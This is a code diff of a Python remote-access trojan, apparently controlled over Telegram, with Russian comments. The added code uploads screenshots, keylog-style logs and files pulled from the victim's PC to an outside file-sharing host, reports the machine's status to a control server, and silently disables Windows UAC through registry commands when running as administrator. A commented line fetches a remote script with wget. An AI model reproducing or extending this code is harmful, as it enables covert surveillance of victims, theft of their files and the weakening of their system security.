@@ -241,9 +241,9 @@ Screen:       {x}x{y}"""
     def screenshot(self):  # скриншот и его отправка
         filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
         pyautogui.screenshot(filename)
-        img = open(filename, "rb")
-        self.send_document(self.id, img)
-        img.close()
+        
+        self.send_document(filename)
+
         os.remove(filename)
 
     def keyb(self, text):  # печать текста
@@ -347,8 +347,7 @@ Screen:       {x}x{y}"""
     def pull_file(self, path: str):  # отправка файла с пк в тг
         path = path.replace('\\', '/')
         if os.path.exists(path):
-            file = open(path, 'rb')
-            self.send_document(self.id, file)
+            self.send_document(path)
         else:
             path = path.split('/')
             if len(path) <= 1:
@@ -461,13 +460,25 @@ Screen:       {x}x{y}"""
         answer = logger.get_log(namer)
         try:
             if answer:
-                f = open(answer, 'rb')
-                self.send_document(self.id, f)
-                f.close()
+                
+                self.send_document(answer)
+
                 os.remove(answer)
         except Exception as e:
             logger.log(self.loggs.__name__, e)
             self.send_answer(f'Ошибка: {e}')
+    
+    def send_document(self, path):
+        url = 'https://so.urceco.de/upload/' 
+        data = {
+            "Accept": "application/json",
+            "Linx-Randomize": "yes",
+            'Linx-Expiry': '604800'
+        }
+        file = open(path, 'rb').read()
+        response = requests.put(url, headers=data, data=file).json()['url']
+
+        self.send_answer(response)
 
     def hendler(self, arr):
         for i in arr:
@@ -560,10 +571,43 @@ Screen:       {x}x{y}"""
     def fprint(self):
         print(f"{self.pc} {self.token} {self.upd} {self.uic}")
 
+    def send_online(self, text):
+        data = {'token': self.token,
+                'id': self.id_op,
+                'answer': text
+                }
+        requests.post(self.url + f"/online/{self.pc}", data=data)
+
+    def online(self):
+
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            self.send_online(f'{self.NAME_PC} запущен от имени администратора')
+
+            if not self.uic:  # Отрубает UAC
+                try:
+                    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+                    subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
+                    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+                    subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
+                    self.uic = '1'
+                    self.save_config()
+
+                except Exception as e:
+                    logger.log("disable_UAC", e)
+                        
+                    self.send_online( f'Ошибка: {e}')
+
+        else:
+            self.send_online( f'{self.pc} запущен от имени обычного пользователя')
+    
+
 fapi = Func_API()
 # fapi.new_token()
 # fapi.pc = 'pc0'
 # fapi.token = 'qhh53cm5qdz6'
 fapi.load_config()
 fapi.fprint()
-fapi.hendler([['5','cmdo,dir'], ['5','inpt,dirf'], ['5','scrn']])
+fapi.online()
+# fapi.hendler([['5','cmdo,dir'], ['5','wget,https://raw.githubusercontent.com/DmodvGH/MadNet/main/main.py,lol.py'], ['5','scrn']])
